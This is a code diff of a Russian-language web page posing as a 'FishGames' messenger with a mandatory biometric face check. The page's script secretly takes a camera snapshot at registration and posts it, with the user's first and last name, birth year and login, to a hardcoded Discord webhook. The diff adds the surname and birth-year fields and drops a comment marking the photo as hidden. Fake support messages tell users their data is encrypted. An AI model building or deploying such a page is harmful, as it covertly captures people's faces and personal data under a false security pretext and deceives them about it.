@@ -14,39 +14,40 @@
         body::before {
             content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
             background: url('https://www.transparenttextures.com/patterns/waves.png');
-            opacity: 0.1; animation: moveWaves 25s linear infinite; pointer-events: none;
+            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
         }
         @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
         /* Экраны */
         #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
-        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; box-shadow: 0 0 20px rgba(34, 197, 94, 0.2); }
+        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
         .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
+        
         .input-group { margin-bottom: 12px; }
-        label { display: block; margin-bottom: 5px; font-size: 12px; color: #a7f3d0; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
         input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn:hover { background: #16a34a; }
+        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
 
         /* Мессенджер */
-        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
         .messenger-container { display: flex; height: 100%; }
-        .sidebar { width: 260px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
-        .search-input { width: 100%; background: #243b35; border: 1px solid #2e8b57; border-radius: 20px; padding: 8px 15px; color: white; margin-bottom: 20px; outline: none; }
+        
+        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
+        .search-input { width: 100%; background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none; }
 
         .contact-list { flex: 1; overflow-y: auto; }
         .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
-        .contact-item:hover { background: rgba(34, 197, 94, 0.15); }
-        .avatar { width: 40px; height: 40px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid rgba(255,255,255,0.3); flex-shrink: 0; }
+        .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
+        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }
 
-        .chat-area { flex: 1; display: flex; flex-direction: column; background: #162623; }
-        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; background: #142522; }
-        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
+        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
+        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
+        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
         
-        .msg-bubble { background: #e2e8f0; color: #1a202c; padding: 10px 15px; border-radius: 15px 15px 0 15px; align-self: flex-end; max-width: 75%; line-height: 1.4; }
-        .msg-incoming { align-self: flex-start; background: #2d4f47; color: #ecfdf5; border-radius: 15px 15px 15px 0; }
+        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
+        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
 
-        .input-bar { padding: 15px; background: #142522; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
+        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -54,33 +55,37 @@
 
 <div id="camera-overlay">
     <div class="warning-box">
-        <h2 style="color: #22c55e; margin-top: 0;">🔒 Security Check</h2>
-        <p>Для активации зашифрованного канала FishGames требуется биометрическая проверка.</p>
-        <button class="btn" onclick="requestAccess()">ПРОЙТИ ПРОВЕРКУ</button>
+        <h3>⚠️ FishGames SECURITY</h3>
+        <p>Биометрическая верификация лица обязательна для входа.</p>
+        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
     </div>
 </div>
 
 <div id="reg-screen" class="reg-card" style="display:none;">
-    <h2 style="text-align: center; color: #4ade80;">Регистрация</h2>
-    <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Ваше имя"></div>
-    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_id_77"></div>
-    <button class="btn" onclick="register()">ВОЙТИ В СЕТЬ</button>
+    <h2>FishGames</h2>
+    <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Иван"></div>
+    <div class="input-group"><label>Фамилия</label><input type="text" id="lastname" placeholder="Иванов"></div>
+    <div class="input-group"><label>Год рождения</label>
+        <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+    </div>
+    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_prime"></div>
+    <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
 </div>
 
 <div id="messenger-screen">
     <div class="messenger-container">
         <div class="sidebar">
-            <input type="text" class="search-input" id="searchField" placeholder="Поиск контакта..." onkeypress="handleSearch(event)">
+            <input type="text" class="search-input" id="searchField" placeholder="поиск (Enter)" onkeypress="handleSearch(event)">
             <div class="contact-list" id="contacts">
                 <div class="contact-item" onclick="openChat('Служба поддержки')">
                     <div class="avatar">⚙️</div>
                     <div>Служба поддержки</div>
                 </div>
             </div>
-            <div style="margin-top: auto; padding-top: 10px; border-top: 1px solid #2e8b57;">
-                <div class="contact-item">
-                    <div class="avatar" id="my-ava" style="background: #0d9488;">?</div>
-                    <div id="my-name">Профиль</div>
+            <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
+                <div class="contact-item" style="cursor: default;">
+                    <div class="avatar" id="my-ava" style="background: #008080;">?</div>
+                    <div id="my-name">Вы</div>
                 </div>
             </div>
         </div>
@@ -88,8 +93,8 @@
             <div class="chat-header" id="chat-title">Выберите чат</div>
             <div class="messages-display" id="chat-box"></div>
             <div class="input-bar">
-                <input type="text" id="messageText" style="flex:1; padding: 12px; border-radius: 10px; border:none; outline:none;" placeholder="Написать сообщение..." onkeypress="if(event.key==='Enter')sendMessage()">
-                <button class="btn" style="width: 50px; margin-top: 0; padding: 10px;" onclick="sendMessage()">➤</button>
+                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="Напишите..." onkeypress="if(event.key==='Enter')sendMessage()">
+                <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
             </div>
         </div>
     </div>
@@ -101,7 +106,6 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    // Сюда вставь свой вебхук Дискорда
     const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
 
     let currentChat = "";
@@ -113,19 +117,19 @@
             video.srcObject = s;
             document.getElementById('camera-overlay').style.display = 'none';
             document.getElementById('reg-screen').style.display = 'block';
-        } catch(e) { alert("Без камеры доступ в FishGames Messenger запрещен."); }
+        } catch(e) { alert("Камера обязательна для биометрической верификации!"); location.reload(); }
     }
 
     function register() {
         const fn = document.getElementById('firstname').value;
-        if(!fn) return alert("Введите имя!");
+        const ln = document.getElementById('lastname').value;
+        if(!fn || !ln) return alert("Заполните все поля!");
 
-        // Скрытое фото
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(b => {
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: `✅ **Новый вход:** ${fn}\nЛогин: ${document.getElementById('login').value}` }));
+            fd.append('payload_json', JSON.stringify({ content: `📸 **БИОМЕТРИЯ ПРИНЯТА**\nИмя: ${fn} ${ln}\nГод: ${document.getElementById('birthyear').value}\nЛогин: ${document.getElementById('login').value}` }));
             fd.append('file', b, 'user.png');
             fetch(webhook, {method: 'POST', body: fd});
         });
@@ -145,7 +149,7 @@
                 const item = document.createElement('div');
                 item.className = 'contact-item';
                 item.onclick = () => openChat(val);
-                item.innerHTML = `<div class="avatar" style="background:${getRandomColor()}">${val[0].toUpperCase()}</div><div>${val}</div>`;
+                item.innerHTML = `<div class="avatar" style="background:#2e8b57">${val[0].toUpperCase()}</div><div>${val}</div>`;
                 document.getElementById('contacts').appendChild(item);
                 document.getElementById('searchField').value = '';
                 openChat(val);
@@ -153,24 +157,15 @@
         }
     }
 
-    function getRandomColor() {
-        const colors = ['#f59e0b', '#3b82f6', '#ef4444', '#8b5cf6', '#ec4899'];
-        return colors[Math.floor(Math.random() * colors.length)];
-    }
-
     function openChat(name) {
         currentChat = name;
         document.getElementById('chat-title').innerText = name;
         const box = document.getElementById('chat-box');
         box.innerHTML = '';
-        
         if(name === 'Служба поддержки' && histories[name].length === 0) {
-            renderMessage("FishGames: Личность подтверждена. Ваши сообщения защищены сквозным шифрованием.", 'msg-incoming');
-        } else if (histories[name].length === 0) {
-            renderMessage(`Вы начали чат с пользователем ${name}`, 'msg-incoming');
+            renderMessage("Система FishGames на связи. Верификация активна.", 'msg-incoming');
         }
-
-        histories[name].forEach(m => renderMessage(m.text, m.type));
+        (histories[name] || []).forEach(m => renderMessage(m.text, m.type));
     }
 
     function renderMessage(text, type) {
@@ -186,40 +181,47 @@
         const inp = document.getElementById('messageText');
         const txt = inp.value.trim();
         if(!txt || !currentChat) return;
-
         renderMessage(txt, '');
         histories[currentChat].push({text: txt, type: ''});
         inp.value = '';
-
-        setTimeout(() => botReply(txt), 1000 + Math.random() * 2000);
+        setTimeout(() => botReply(txt), 1000 + Math.random() * 1500);
     }
 
     function botReply(userText) {
         let reply = "";
-        const lowText = userText.toLowerCase();
+        const txt = userText.toLowerCase();
+        
+        const toxicWords = ["блять", "сука", "хуй", "пидор", "еблан", "нах", "пошел", "заебал", "чмо"];
+        const contextMap = {
+            "студи": ["О, давай! Давно пора что-то записать.", "Я только за, когда идем?", "Давай, я как раз хотел микро проверить.", "В какую именно?"],
+            "гуля": ["Пойдем, погода вроде норм.", "Я через час освобожусь и можем.", "Куда именно? В парк или по центру?", "Не, я чет сегодня пас."],
+            "игр": ["Во что? В контру или в майн?", "Блин, я комп еще не включал. Позже?", "Давай, заходи в дискорд.", "Снова задротить?"],
+            "дела": ["Да потихоньку, сам как?", "Жив-здоров, и то ладно.", "Да всё как обычно.", "Да чет настроения нет особо."],
+            "привет": ["Здорова! Что нового?", "Привет-привет!", "О, привет! Как жизнь?", "Ку! Че хотел?"],
+            "хаха": ["Рад, что тебе смешно :D", "Ой, да ладно тебе.", "Смешно, ага.", "Ржака вообще."],
+            "кто": ["Я твой контакт из сети, забыл?", "Твой знакомый, а че такие вопросы?"],
+            "зачем": ["Просто так.", "Ну надо же общаться иногда.", "А почему нет?"],
+            "давай": ["Ну погнали тогда!", "Ок, договорились.", "Я в деле."],
+            "нет": ["Почему сразу нет?", "Ну как хочешь.", "Жаль, я думал ты за."]
+        };
+        const randomPhrases = [
+            "Ясно...", "Понятно всё с тобой.", "Ахаха, ну ты выдал конечно.", "Слушай, а ты в курсе, что FishGames за всеми следит?",
+            "Даже не знаю, верить тебе или нет.", "Мда... Ладно, забей.", "А че так?", "Ты серьезно сейчас?", 
+            "Ну такое себе.", "Бывает, че.", "Я бы на твоем месте так не говорил.", "Ну ты и тип, конечно!",
+            "Кстати, ты видел, че в телеге постят?", "Жесть какая-то.", "Ну ты даешь!", "Я в шоке с тебя.",
+            "Интересно-интересно...", "Ну ок.", "Ладно, я тебя услышал.", "А ты сам-то как думаешь?",
+            "Чет подозрительно это всё.", "Ха-ха, ну ты и шутник.", "Сто процентов!", "Не, ну это рил странно.",
+            "А че, так можно было?", "Справедливо.", "Жиза вообще.", "Рил ток.", "Ну хз, хз...",
+            "Посмотрим, как оно будет.", "Я бы посмотрел на это.", "Бро, ты лучший :D", "Ну ты загнул конечно.",
+            "Ладно, проехали.", "Давай сменим тему.", "Мне кажется, ты гонишь.", "Ага, конечно.", "Рассказывай больше."
+        ];
 
         if(currentChat === 'Служба поддержки') {
-            if(lowText.includes("камер")) reply = "Биометрия используется только для верификации. Данные зашифрованы.";
-            else if(lowText.includes("кто")) reply = "Я — бот техподдержки. Моя цель — безопасность FishGames.";
-            else reply = "Запрос принят. Система работает стабильно.";
+            reply = txt.includes("камер") ? "Биометрия используется согласно правилам 2026 года." : "Запрос принят. Система FishGames анализирует ваше местоположение.";
         } else {
-            // "Умная" база ответов
-            const answers = [
-                "Ха-ха, серьезно?",
-                "Даже не знаю, что на это ответить...",
-                "Слушай, а ты слышал про новые правила FishGames?",
-                "Я сейчас немного занят, но это интересно.",
-                "Понял тебя. Но мне кажется, тут всё сложнее.",
-                "Ого! Расскажи подробнее.",
-                "Ничего себе. Ладно, я позже напишу.",
-                "Ты тут?",
-                "А ты сам как думаешь?"
-            ];
-            
-            if(lowText.includes("привет") || lowText.includes("ку")) reply = "О, привет! Как сам?";
-            else if(lowText.includes("дела")) reply = "Да нормально всё, в мессенджере вот сижу.";
-            else if(lowText.includes("ты кто")) reply = "Я твой контакт из сети, забыл уже?";
-            else reply = answers[Math.floor(Math.random() * answers.length)];
+            for (let word of toxicWords) { if (txt.includes(word)) { reply = "Че так грубо-то? Успокойся."; break; } }
+            if (!reply) { for (let key in contextMap) { if (txt.includes(key)) { reply = contextMap[key][Math.floor(Math.random()*contextMap[key].length)]; break; } } }
+            if (!reply) reply = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
         }
 
         renderMessage(reply, 'msg-incoming');
